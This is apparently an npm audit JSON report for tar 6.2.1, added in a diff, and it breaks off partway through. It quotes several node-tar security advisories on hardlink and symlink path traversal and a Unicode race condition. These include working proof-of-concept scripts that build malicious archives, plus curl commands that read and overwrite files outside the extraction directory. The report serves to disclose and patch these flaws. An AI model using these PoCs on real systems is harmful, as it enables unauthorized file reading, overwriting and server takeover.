@@ -1,0 +1,582 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "tar",
+      "resolves": [
+        {
+          "id": 1112659,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113300,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113375,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114200,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114302,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114680,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120782,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123939,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123940,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123941,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123942,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1145647,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1112659": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24842\n- https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46\n- https://github.com/advisories/GHSA-34x7-hfp2-rc4v",
+      "created": "2026-01-28T16:35:31.000Z",
+      "id": 1112659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "reported_by": null,
+      "title": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24842"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.7",
+      "github_advisory_id": "GHSA-34x7-hfp2-rc4v",
+      "recommendation": "Upgrade to version 7.5.7 or later",
+      "patched_versions": ">=7.5.7",
+      "updated": "2026-01-28T16:35:31.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-34x7-hfp2-rc4v"
+    },
+    "1113300": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23745\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1113300,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-02-18T23:43:47.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    },
+    "1113375": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-83g3-92jg-28cx\n- https://github.com/isaacs/node-tar/commit/2cb1120bcefe28d7ecc719b41441ade59c52e384\n- https://github.com/isaacs/node-tar/commit/d18e4e1f846f4ddddc153b0f536a19c050e7499f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26960\n- https://github.com/advisories/GHSA-83g3-92jg-28cx",
+      "created": "2026-02-18T00:57:13.000Z",
+      "id": 1113375,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -> ../..`\n2. `a/b/escape -> c/up/../..`\n3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`\n\n- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`\n\nAs a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",
+      "reported_by": null,
+      "title": "Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26960"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.8",
+      "github_advisory_id": "GHSA-83g3-92jg-28cx",
+      "recommendation": "Upgrade to version 7.5.8 or later",
+      "patched_versions": ">=7.5.8",
+      "updated": "2026-02-20T16:47:50.000Z",
+      "cvss": {
+        "score": 7.1,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-83g3-92jg-28cx"
+    },
+    "1114200": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-qffp-2rhf-9h96\n- https://github.com/isaacs/node-tar/commit/7bc755dd85e623c0279e08eb3784909e6d7e4b9f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-29786\n- https://github.com/advisories/GHSA-qffp-2rhf-9h96",
+      "created": "2026-03-05T00:52:32.000Z",
+      "id": 1114200,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\ncd test-workspace\nnode poc.cjs && ls -l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "reported_by": null,
+      "title": "tar has Hardlink Path Traversal via Drive-Relative Linkpath",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-29786"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.9",
+      "github_advisory_id": "GHSA-qffp-2rhf-9h96",
+      "recommendation": "Upgrade to version 7.5.10 or later",
+      "patched_versions": ">=7.5.10",
+      "updated": "2026-03-09T15:49:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-qffp-2rhf-9h96"
+    },
+    "1114302": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31802\n- https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad\n- https://github.com/advisories/GHSA-9ppj-qmqm-q256",
+      "created": "2026-03-10T23:44:58.000Z",
+      "id": 1114302,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\nnode poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "reported_by": null,
+      "title": "node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31802"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.10",
+      "github_advisory_id": "GHSA-9ppj-qmqm-q256",
+      "recommendation": "Upgrade to version 7.5.11 or later",
+      "patched_versions": ">=7.5.11",
+      "updated": "2026-03-10T23:44:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-9ppj-qmqm-q256"
+    },
+    "1114680": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
+      "created": "2026-01-21T01:05:49.000Z",
+      "id": 1114680,
+      "npm_advisory_id": null,
+      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability 